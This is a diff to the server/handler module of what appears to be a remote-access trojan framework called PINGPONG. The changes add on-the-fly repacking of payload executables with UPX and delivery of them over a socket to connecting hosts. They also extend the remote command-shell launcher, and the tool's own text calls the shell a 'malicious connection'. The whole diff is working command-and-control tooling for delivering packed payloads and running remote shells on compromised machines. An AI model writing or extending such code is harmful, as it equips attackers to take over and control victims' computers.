@@ -11,6 +11,7 @@ import threading
 import ctypes
 import os
 import inspect
+import payload.payload_packer
 def _async_raise(tid, exctype):
   """raises the exception, performs cleanup if needed"""
   tid = ctypes.c_long(tid)
@@ -78,10 +79,26 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
         len_id = conn.recv(1024).decode('utf8')
         conn.send(b'OK')
         payload_id = conn.recv(int(len_id)).decode('utf8')
-        payload_id = payload_id + '.exe'
-        if os.path.isfile(f'./payload/upload_payload/{payload_id}'):
+        _payload_id_with_exe = payload_id + '.exe'
+        if os.path.isfile(f'./payload/upload_payload/{_payload_id_with_exe}'):
             conn.send(b'OK')
-            with open(f'./payload/upload_payload/{payload_id}', 'rb') as f:
+            with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
+                se_data = f.read()
+                main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
+                conn.send(bytes(str(len(se_data)), 'utf8'))
+                conn.recv(1024)
+                conn.send(se_data)
+                conn.close()
+                s.close()
+                break
+        else:
+            conn.send(b'wait')
+            main.print_error('handler>[-]The payload is missing!')
+            main.print_normal('handler>[*]Makeing it again, using the current settings......')
+            upx_dir = input("handler>[*]Please input the upx_dir>")
+            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_ask=False, is_ask_ip=ip, is_ask_port=port, is_basic_payload=True, _payload_id=payload_id, is_return_main=False)
+            conn.send(b'OK')
+            with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
                 se_data = f.read()
                 main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
                 conn.send(bytes(str(len(se_data)), 'utf8'))
@@ -112,6 +129,8 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
 #连接程序
 def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
     #请求发送函数：检查连接
+    # session_pool = main.get_value('connect_pool')
+    # my_id = session_pool.index([conn, my_ip, my_port, ip, port, 'PINGPONG session']) + 1
     import PINGPONG_script.addsend
     while True:
         if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
@@ -168,7 +187,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
             main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
             main.print_normal("handler>[*]Back to main console......")
             connect_pool = main.get_value('connect_pool')
-            connect_pool.remove([conn, my_ip, my_port, ip, int(port), 'PINGPONG session'])
+            connect_pool.remove([conn, my_ip, my_port, ip, port,'PINGPONG session'])
             main.set_config('connect_pool', connect_pool)
             conn.close()
             main.main()
@@ -201,7 +220,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
                 cmd_port = random.randint(5000, 8000)
                 conn.send(bytes(str(cmd_port), "utf8"))
                 conn.recv(1024)
-                PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port)
+                PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port, _main_port=port)
         elif command == "upload" or command == "UPLOAD":
             import PINGPONG_script.upload
             if PINGPONG_script.addsend.App_send('UPLOAD_APP', False, conn):
